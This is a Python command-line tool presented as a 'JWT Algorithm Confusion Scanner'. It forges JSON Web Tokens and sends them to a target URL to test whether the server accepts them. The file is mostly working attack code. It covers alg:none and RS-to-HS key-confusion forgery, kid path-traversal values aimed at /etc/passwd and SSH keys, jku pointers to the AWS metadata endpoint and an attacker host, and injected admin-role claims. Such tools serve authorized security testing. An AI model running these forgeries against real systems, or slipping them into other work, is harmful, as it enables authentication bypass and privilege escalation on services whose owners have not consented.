#!/usr/bin/env python3
"""
JWT Algorithm Confusion Scanner

This tool tests for JWT algorithm confusion vulnerabilities by attempting various
attack vectors including alg:none, algorithm switching, and key confusion attacks.
"""

import argparse
import json
import base64
import hmac
import hashlib
import requests
from typing import Dict, List, Tuple, Optional, Any
import urllib3
import sys
import time
from colorama import init, Fore, Style

# Disable SSL warnings for testing purposes
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init()

class JWTConfusionScanner:
    def __init__(self, 
                 target_url: str, 
                 cookie_name: Optional[str] = None,
                 auth_header: bool = False, 
                 token: Optional[str] = None,
                 public_key_path: Optional[str] = None,
                 custom_payloads: Optional[List[Dict]] = None,
                 verbose: bool = False,
                 delay: float = 0.5):
        """
        Initialize the JWT Confusion Scanner
        
        Args:
            target_url: URL to test
            cookie_name: Name of the cookie containing the JWT
            auth_header: Whether to use Authorization header
            token: JWT token to test (if not provided, will try to extract from request)
            public_key_path: Path to public key file (if available)
            custom_payloads: List of custom payloads to try
            verbose: Enable verbose output
            delay: Delay between requests to avoid rate limiting
        """
        self.target_url = target_url
        self.cookie_name = cookie_name
        self.auth_header = auth_header
        self.token = token
        self.public_key = None
        self.verbose = verbose
        self.delay = delay
        self.custom_payloads = custom_payloads or []
        self.session = requests.Session()
        
        # Success indicators - patterns that might indicate successful exploitation
        self.success_indicators = [
            "admin", "authenticated", "authorized", "welcome", "dashboard", 
            "success", "valid", "profile", "account", "logged in"
        ]
        
        # Load public key if provided
        if public_key_path:
            try:
                with open(public_key_path, 'r') as f:
                    self.public_key = f.read().strip()
                print(f"{Fore.GREEN}[+] Loaded public key from {public_key_path}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Failed to load public key: {str(e)}{Style.RESET_ALL}")
    
    def _print_verbose(self, message: str):
        """Print message only if verbose mode is enabled"""
        if self.verbose:
            print(message)
    
    def _decode_jwt(self, token: str) -> Tuple[Dict, Dict, str]:
        """
        Decode JWT without verification
        
        Returns:
            Tuple of (header, payload, signature)
        """
        parts = token.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")
            
        def decode_part(part):
            # Add padding if necessary
            padded = part + '=' * (4 - len(part) % 4) if len(part) % 4 else part
            return json.loads(base64.urlsafe_b64decode(padded).decode('utf-8'))
        
        header = decode_part(parts[0])
        payload = decode_part(parts[1])
        signature = parts[2]
        
        return header, payload, signature
    
    def _encode_jwt_part(self, part: Dict) -> str:
        """Encode a JWT part (header or payload)"""
        json_str = json.dumps(part, separators=(',', ':'))
        encoded = base64.urlsafe_b64encode(json_str.encode()).decode('utf-8')
        return encoded.rstrip('=')  # Remove padding
    
    def _create_token(self, header: Dict, payload: Dict, key: str = '') -> str:
        """
        Create a JWT token with the given header, payload, and key
        
        Args:
            header: JWT header
            payload: JWT payload
            key: Key to use for signing (empty for none algorithm)
            
        Returns:
            JWT token string
        """
        header_encoded = self._encode_jwt_part(header)
        payload_encoded = self._encode_jwt_part(payload)
        
        unsigned_token = f"{header_encoded}.{payload_encoded}"
        
        if header.get('alg') == 'none' or header.get('alg') == 'None' or not header.get('alg'):
            # No signature for 'none' algorithm
            signature = ""
        elif header.get('alg') == 'HS256':
            # HMAC-SHA256
            signature = hmac.new(
                key.encode(), 
                unsigned_token.encode(), 
                hashlib.sha256
            ).digest()
            signature = base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')
        elif header.get('alg') == 'HS384':
            # HMAC-SHA384
            signature = hmac.new(
                key.encode(), 
                unsigned_token.encode(), 
                hashlib.sha384
            ).digest()
            signature = base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')
        elif header.get('alg') == 'HS512':
            # HMAC-SHA512
            signature = hmac.new(
                key.encode(), 
                unsigned_token.encode(), 
                hashlib.sha512
            ).digest()
            signature = base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')
        else:
            # For other algorithms (RS256, ES256, etc.), we can't sign properly
            # Just use an empty signature for testing
            signature = ""
            
        return f"{unsigned_token}.{signature}"
    
    def _make_request(self, token: str) -> requests.Response:
        """Make a request with the given token"""
        headers = {}
        cookies = {}
        
        if self.auth_header:
            headers['Authorization'] = f"Bearer {token}"
        elif self.cookie_name:
            cookies[self.cookie_name] = token
        else:
            # If no method specified, try both
            headers['Authorization'] = f"Bearer {token}"
            # Also try to set a few common cookie names
            for name in ['jwt', 'token', 'access_token', 'id_token', 'session']:
                cookies[name] = token
        
        try:
            response = self.session.get(
                self.target_url,
                headers=headers,
                cookies=cookies,
                verify=False,
                allow_redirects=True,
                timeout=10
            )
            # Add delay to avoid rate limiting
            time.sleep(self.delay)
            return response
        except requests.RequestException as e:
            print(f"{Fore.RED}[!] Request error: {str(e)}{Style.RESET_ALL}")
            return None
    
    def _evaluate_response(self, response: requests.Response, attack_type: str) -> bool:
        """
        Analyze response to determine if the attack was successful
        
        Returns:
            Boolean indicating if the attack might have been successful
        """
        if not response:
            return False
            
        # Check status code first
        if response.status_code < 400:
            self._print_verbose(f"{Fore.YELLOW}[*] Got non-error status code: {response.status_code}{Style.RESET_ALL}")
            
            # Check for success indicators in response
            for indicator in self.success_indicators:
                if indicator.lower() in response.text.lower():
                    print(f"{Fore.GREEN}[+] Possible success indicator found: '{indicator}'{Style.RESET_ALL}")
                    return True
            
            # Check for sensitive data in response that might indicate successful attack
            try:
                if 'application/json' in response.headers.get('Content-Type', ''):
                    data = response.json()
                    # Look for interesting fields that might indicate success
                    interesting_fields = ['user', 'admin', 'role', 'permissions', 'email', 'username']
                    for field in interesting_fields:
                        if field in str(data).lower():
                            print(f"{Fore.GREEN}[+] Interesting data found in JSON response (field: {field}){Style.RESET_ALL}")
                            return True
            except:
                pass
        
        return False
    
    def _try_attack(self, attack_type: str, token: str, description: str) -> bool:
        """
        Try an attack with the modified token
        
        Args:
            attack_type: String identifier for the attack type
            token: Modified JWT token
            description: Human-readable description of the attack
            
        Returns:
            Boolean indicating if the attack might have been successful
        """
        print(f"{Fore.BLUE}[*] Trying {attack_type}: {description}{Style.RESET_ALL}")
        self._print_verbose(f"    Token: {token}")
        
        response = self._make_request(token)
        if not response:
            return False
            
        self._print_verbose(f"    Status code: {response.status_code}")
        
        success = self._evaluate_response(response, attack_type)
        if success:
            print(f"{Fore.GREEN}[+] Potential vulnerability found! Attack: {attack_type}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Vulnerable token: {token}{Style.RESET_ALL}")
            
        return success
    
    def _get_original_token(self) -> str:
        """
        Get the original token either from the provided token or by making a request
        to the target URL and extracting it from the response
        """
        if self.token:
            return self.token
            
        print(f"{Fore.BLUE}[*] No token provided. Attempting to get token from target...{Style.RESET_ALL}")
        
        try:
            response = self.session.get(self.target_url, verify=False, timeout=10)
            
            # Check cookies for JWT
            for cookie_name, cookie_value in response.cookies.items():
                if self._is_jwt(cookie_value):
                    print(f"{Fore.GREEN}[+] Found JWT in cookie: {cookie_name}{Style.RESET_ALL}")
                    self.cookie_name = cookie_name
                    return cookie_value
            
            # Check Authorization header
            auth_header = response.headers.get('Authorization', '')
            if auth_header.startswith('Bearer '):
                token = auth_header.split(' ')[1]
                if self._is_jwt(token):
                    print(f"{Fore.GREEN}[+] Found JWT in Authorization header{Style.RESET_ALL}")
                    self.auth_header = True
                    return token
                    
            print(f"{Fore.RED}[!] No JWT token found in the response.{Style.RESET_ALL}")
            return None
            
        except requests.RequestException as e:
            print(f"{Fore.RED}[!] Failed to get token from target: {str(e)}{Style.RESET_ALL}")
            return None
    
    def _is_jwt(self, token: str) -> bool:
        """Check if a string looks like a JWT"""
        if not token or not isinstance(token, str):
            return False
            
        parts = token.split('.')
        if len(parts) != 3:
            return False
            
        try:
            # Try to decode header
            padded = parts[0] + '=' * (4 - len(parts[0]) % 4) if len(parts[0]) % 4 else parts[0]
            header = json.loads(base64.urlsafe_b64decode(padded).decode('utf-8'))
            # Check for alg field
            return 'alg' in header
        except:
            return False
    
    def test_alg_none(self, header: Dict, payload: Dict) -> List[bool]:
        """
        Test for 'none' algorithm vulnerability
        
        Returns:
            List of booleans indicating success for each variant tried
        """
        print(f"\n{Fore.CYAN}[*] Testing for 'none' algorithm vulnerability...{Style.RESET_ALL}")
        results = []
        
        # Try different variants of 'none'
        for alg_value in ['none', 'None', 'NONE', 'nOnE']:
            modified_header = header.copy()
            modified_header['alg'] = alg_value
            
            token = self._create_token(modified_header, payload)
            
            # Empty signature variant
            empty_sig_token = '.'.join(token.split('.')[:2]) + '.'
            
            result = self._try_attack(
                'alg-none',
                empty_sig_token,
                f"Algorithm set to '{alg_value}' with empty signature"
            )
            results.append(result)
        
        return results
        
    def test_key_confusion(self, header: Dict, payload: Dict, orig_token: str) -> List[bool]:
        """
        Test for algorithm confusion with key confusion attacks
        
        Returns:
            List of booleans indicating success for each variant tried
        """
        print(f"\n{Fore.CYAN}[*] Testing for key confusion vulnerability...{Style.RESET_ALL}")
        results = []
        
        # If original alg is RS* or ES*, try switching to HS* using the public key as the HMAC key
        if header.get('alg', '').startswith(('RS', 'ES', 'PS')) and self.public_key:
            self._print_verbose(f"Original algorithm is {header['alg']}, trying HMAC with public key")
            
            # Try variants of HMAC
            for new_alg in ['HS256', 'HS384', 'HS512']:
                modified_header = header.copy()
                modified_header['alg'] = new_alg
                
                # Create token signed with public key as HMAC secret
                token = self._create_token(modified_header, payload, self.public_key)
                
                result = self._try_attack(
                    'key-confusion',
                    token,
                    f"Switched from {header['alg']} to {new_alg} using public key as HMAC secret"
                )
                results.append(result)
                
        # If no public key is provided, try with common public key values
        else:
            self._print_verbose("No public key provided, trying with common values")
            
            # Try with common values and empty string
            for key_value in ['', 'public_key', 'key', 'SECRET', 'PUBLIC', header.get('kid', '')]:
                modified_header = header.copy()
                modified_header['alg'] = 'HS256'  # Switch to HMAC
                
                token = self._create_token(modified_header, payload, key_value)
                
                result = self._try_attack(
                    'key-confusion',
                    token,
                    f"Switched to HS256 with key value: '{key_value}'"
                )
                results.append(result)
        
        return results
    
    def test_algorithm_substitution(self, header: Dict, payload: Dict, orig_token: str) -> List[bool]:
        """
        Test for simple algorithm substitution
        
        Args:
            header: Original JWT header
            payload: Original JWT payload
            orig_token: Original JWT token string
            
        Returns:
            List of booleans indicating success for each variant tried
        """
        print(f"\n{Fore.CYAN}[*] Testing for algorithm substitution...{Style.RESET_ALL}")
        results = []
        
        # Try switching between algorithms
        orig_alg = header.get('alg', '')
        
        for new_alg in ['HS256', 'HS384', 'HS512', 'RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512']:
            if new_alg == orig_alg:
                continue
                
            modified_header = header.copy()
            modified_header['alg'] = new_alg
            
            # For this test, we won't try to create a valid signature - just want to see if
            # server accepts a token with a different alg
            token_parts = orig_token.split('.')
            new_header_encoded = self._encode_jwt_part(modified_header)
            modified_token = f"{new_header_encoded}.{token_parts[1]}.{token_parts[2]}"
            
            result = self._try_attack(
                'alg-substitution',
                modified_token,
                f"Changed algorithm from {orig_alg} to {new_alg} without changing signature"
            )
            results.append(result)
        
        return results
    
    def test_kid_manipulation(self, header: Dict, payload: Dict, orig_token: str) -> List[bool]:
        """
        Test for kid (Key ID) header parameter manipulation
        
        Returns:
            List of booleans indicating success for each variant tried
        """
        print(f"\n{Fore.CYAN}[*] Testing for 'kid' header manipulation...{Style.RESET_ALL}")
        results = []
        
        # If kid parameter exists, try to manipulate it
        if 'kid' in header:
            self._print_verbose(f"Original kid: {header['kid']}")
            
            # Try different path traversal payloads
            for kid_value in [
                '../../../../../../../dev/null',
                '/dev/null',
                'file:///dev/null',
                'null',
                '../../../../../../../etc/passwd',
                '../../.ssh/id_rsa',
                '1',
                'private',
                'public',
                '../secrets/hmac.key'
            ]:
                modified_header = header.copy()
                modified_header['kid'] = kid_value
                
                # Keep the original algorithm and signature for this test
                token_parts = orig_token.split('.')
                new_header_encoded = self._encode_jwt_part(modified_header)
                modified_token = f"{new_header_encoded}.{token_parts[1]}.{token_parts[2]}"
                
                result = self._try_attack(
                    'kid-manipulation',
                    modified_token,
                    f"Changed 'kid' parameter to: {kid_value}"
                )
                results.append(result)
        else:
            # If no kid parameter, try adding one
            for kid_value in ['null', '/dev/null', '1', 'file:///dev/null']:
                modified_header = header.copy()
                modified_header['kid'] = kid_value
                
                token_parts = orig_token.split('.')
                new_header_encoded = self._encode_jwt_part(modified_header)
                modified_token = f"{new_header_encoded}.{token_parts[1]}.{token_parts[2]}"
                
                result = self._try_attack(
                    'kid-manipulation',
                    modified_token,
                    f"Added 'kid' parameter with value: {kid_value}"
                )
                results.append(result)
        
        return results
    
    def test_jku_manipulation(self, header: Dict, payload: Dict, orig_token: str) -> List[bool]:
        """
        Test for jku (JWK Set URL) header parameter manipulation
        
        Returns:
            List of booleans indicating success for each variant tried
        """
        print(f"\n{Fore.CYAN}[*] Testing for 'jku' header manipulation...{Style.RESET_ALL}")
        results = []
        
        # If JWT uses RS* or ES* algorithm, try to add or manipulate jku
        if header.get('alg', '').startswith(('RS', 'ES')):
            # Some domains that might be trusted
            for jku_value in [
                'https://localhost/.well-known/jwks.json',
                'https://127.0.0.1/.well-known/jwks.json',
                'https://169.254.169.254/latest/meta-data/',  # AWS metadata
                'file:///etc/passwd',
                'https://evil-attacker.com/jwks.json'
            ]:
                modified_header = header.copy()
                modified_header['jku'] = jku_value
                
                token_parts = orig_token.split('.')
                new_header_encoded = self._encode_jwt_part(modified_header)
                modified_token = f"{new_header_encoded}.{token_parts[1]}.{token_parts[2]}"
                
                result = self._try_attack(
                    'jku-manipulation',
                    modified_token,
                    f"{'Modified' if 'jku' in header else 'Added'} 'jku' parameter with: {jku_value}"
                )
                results.append(result)
        
        return results
    
    def test_payload_manipulation(self, header: Dict, payload: Dict) -> List[bool]:
        """
        Test for basic payload manipulation with algorithm confusion
        
        Returns:
            List of booleans indicating success for each variant tried
        """
        print(f"\n{Fore.CYAN}[*] Testing for payload manipulation with algorithm confusion...{Style.RESET_ALL}")
        results = []
        
        # Try adding admin privileges or changing user roles
        modified_payload = payload.copy()
        
        # Common escalation keys/values
        escalation_attempts = [
            ('admin', True),
            ('isAdmin', True),
            ('role', 'admin'),
            ('roles', ['admin']),
            ('permissions', ['admin']),
            ('groups', ['admin', 'administrator']),
            ('username', 'admin'),
            ('user_id', '1'),
            ('scope', 'admin'),
            ('privilege', 'admin')
        ]
        
        for key, value in escalation_attempts:
            attack_payload = modified_payload.copy()
            attack_payload[key] = value
            
            # Try with alg:none attack first
            none_header = header.copy()
            none_header['alg'] = 'none'
            none_token = '.'.join(self._create_token(none_header, attack_payload).split('.')[:2]) + '.'
            
            result = self._try_attack(
                'payload-manipulation',
                none_token,
                f"Added '{key}:{value}' with alg:none attack"
            )
            results.append(result)
            
            # If we have a public key, try key confusion attack too
            if self.public_key and header.get('alg', '').startswith(('RS', 'ES')):
                hs_header = header.copy()
                hs_header['alg'] = 'HS256'
                hs_token = self._create_token(hs_header, attack_payload, self.public_key)
                
                result = self._try_attack(
                    'payload-manipulation',
                    hs_token,
                    f"Added '{key}:{value}' with key confusion attack"
                )
                results.append(result)
        
        return results
    
    def test_custom_payloads(self, header: Dict, payload: Dict) -> List[bool]:
        """
        Test with user-provided custom payloads
        
        Returns:
            List of booleans indicating success for each variant tried
        """
        if not self.custom_payloads:
            return []
            
        print(f"\n{Fore.CYAN}[*] Testing with custom payloads...{Style.RESET_ALL}")
        results = []
        
        for i, custom in enumerate(self.custom_payloads):
            custom_header = custom.get('header', header.copy())
            custom_payload = custom.get('payload', payload.copy())
            custom_key = custom.get('key', '')
            
            token = self._create_token(custom_header, custom_payload, custom_key)
            
            result = self._try_attack(
                'custom-payload',
                token,
                f"Custom payload #{i+1}"
            )
            results.append(result)
        
        return results
    
    def scan(self) -> Dict[str, Any]:
        """
        Run all tests for JWT algorithm confusion
        
        Returns:
            Dictionary with scan results
        """
        print(f"{Fore.GREEN}[+] Starting JWT Algorithm Confusion Scanner{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[*] Target URL: {self.target_url}{Style.RESET_ALL}")
        
        # Get original token
        orig_token = self._get_original_token()
        if not orig_token:
            print(f"{Fore.RED}[!] No JWT token found or provided. Exiting.{Style.RESET_ALL}")
            return {'success': False, 'message': 'No JWT token found or provided.'}
        
        try:
            # Decode token
            header, payload, signature = self._decode_jwt(orig_token)
            
            print(f"{Fore.GREEN}[+] Successfully decoded JWT token{Style.RESET_ALL}")
            self._print_verbose(f"Header: {json.dumps(header, indent=2)}")
            self._print_verbose(f"Payload: {json.dumps(payload, indent=2)}")
            
            # Run all tests
            results = {}
            
            results['alg_none'] = self.test_alg_none(header, payload)
            results['key_confusion'] = self.test_key_confusion(header, payload, orig_token)
            results['algorithm_substitution'] = self.test_algorithm_substitution(header, payload, orig_token) 
            results['kid_manipulation'] = self.test_kid_manipulation(header, payload, orig_token)
            results['jku_manipulation'] = self.test_jku_manipulation(header, payload, orig_token)
            results['payload_manipulation'] = self.test_payload_manipulation(header, payload)
            results['custom_payloads'] = self.test_custom_payloads(header, payload)
            
            # Compile summary
            vulnerable = False
            for test_name, test_results in results.items():
                if any(test_results):
                    vulnerable = True
                    break
            
            print("\n" + "="*60)
            if vulnerable:
                print(f"{Fore.RED}[!] Target appears VULNERABLE to JWT algorithm confusion attacks!{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}[+] No vulnerabilities detected. Target appears to properly validate JWT tokens.{Style.RESET_ALL}")
            print("="*60)
            
            return {
                'success': True,
                'vulnerable': vulnerable,
                'original_token': orig_token,
                'header': header,
                'payload': payload,
                'results': results
            }
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error during scanning: {str(e)}{Style.RESET_ALL}")
            import traceback
            traceback.print_exc()
            return {'success': False, 'message': str(e)}


def main():
    parser = argparse.ArgumentParser(description='JWT Algorithm Confusion Scanner')
    parser.add_argument('url', help='Target URL to test')
    parser.add_argument('-t', '--token', help='JWT token to test')
    parser.add_argument('-c', '--cookie', help='Name of the cookie containing the JWT')
    parser.add_argument('-a', '--auth-header', action='store_true', help='Use Authorization header')
    parser.add_argument('-k', '--public-key', help='Path to public key file')
    parser.add_argument('-p', '--payload', help='Path to custom payload JSON file')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-d', '--delay', type=float, default=0.5, help='Delay between requests (seconds)')
    
    args = parser.parse_args()
    
    custom_payloads = []
    if args.payload:
        try:
            with open(args.payload, 'r') as f:
                custom_payloads = json.load(f)
                if not isinstance(custom_payloads, list):
                    custom_payloads = [custom_payloads]
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading custom payload file: {str(e)}{Style.RESET_ALL}")
    
    scanner = JWTConfusionScanner(
        target_url=args.url,
        cookie_name=args.cookie,
        auth_header=args.auth_header,
        token=args.token,
        public_key_path=args.public_key,
        custom_payloads=custom_payloads,
        verbose=args.verbose,
        delay=args.delay
    )
    
    scanner.scan()


if __name__ == "__main__":
    main()
